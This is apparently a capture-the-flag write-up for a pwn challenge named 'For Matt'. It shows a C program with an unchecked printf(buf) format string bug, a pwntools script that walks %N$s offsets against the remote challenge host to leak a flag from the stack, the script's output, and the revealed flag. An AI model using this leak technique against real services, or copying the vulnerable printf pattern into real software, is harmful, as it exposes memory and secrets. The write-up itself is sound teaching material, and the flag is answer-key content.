# For Matt

## Pwn

### I went to print something but there's a For Matt problem?  Maybe you can figure out where the flag is.

This is clearly a format string exploit, even without looking at the code.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;

  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("I'm testing a proof of concept.  You won't overflow the buffer.  This program will repeat whatever you input");

  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Where's the flag.txt file?\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  while(1) {
    printf(": ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }
  return 0;
}
```

The `printf(buf)` is the error.  It allows user input to be printed without a format specifier.

There are different types of format string exploits.  For this one, the flag is on the stack, so theoretically, we can print the stack down until we get the flag.  This is the script I used.  It rolls down the stack, printing a string and its position.

```python
from pwn import *
#elf = context.binary = ELF('./formatt', checksec=False)
#context.log_level = "DEBUG"

for i in range(50):
  try:
    p = remote('ctf.teractf.com', '2231')
    p.sendlineafter(b': ', '%{}$s'.format(i).encode())
    result = p.recvuntil(b': ')
    print(str(i) + ': ' + str(result))
    p.close()
  except EOFError:
    pass
```
This is the output with the flag!  :joy:

```sh
% python3 solver.py SILENT
0: b'%0$s\n: '
4: b'\n: '
5: b'(null)\n: '
6: b'\xe6\x7f\xfc\xf2\xff\x7f\n: '
10: b'teractf{1_m3ant_f0rmat_n0t_f0rMatt}\n\n: '
11: b'\x88$\xad\xfb\n: '
17: b'0t_f0rMatt}\n\n: '
19: b'(null)\n: '
25: b'(null)\n: '
26: b'(null)\n: '
27: b'\xf3\x0f\x1e\xfaUf\x0f\xef\xc0H\x89\xe5AWI\x89\xffAVAUATSH\x81\xec\x88\x02\n: '
28: b'@A\x9eg[U\n: '
30: b'0\x96\xd5\x8a\xfe\x7f\n: '
31: b'\x89\xc7\xe8\xcf\xd9\x01\n: '
32: b'\x88\xcd\xa4\xdcJV\n: '
33: b'\xe6/1$\xfe\x7f\n: '
35: b'\xf3\x0f\x1e\xfaUH\x89\xe5H\x81\xec\xc0\n: '
36: b'\xe6\x9f\x10\xb9\xfd\x7f\n: '
39: b'(null)\n: '
40: b'\xe0\xa1O\xe4}U\n: '
41: b'\xe0\xb2;|\xbf\x7f\n: '
45: b'(null)\n: '
46: b'(null)\n: '
48: b'\x01\n: '
```

**teractf{1_m3ant_f0rmat_n0t_f0rMatt}**
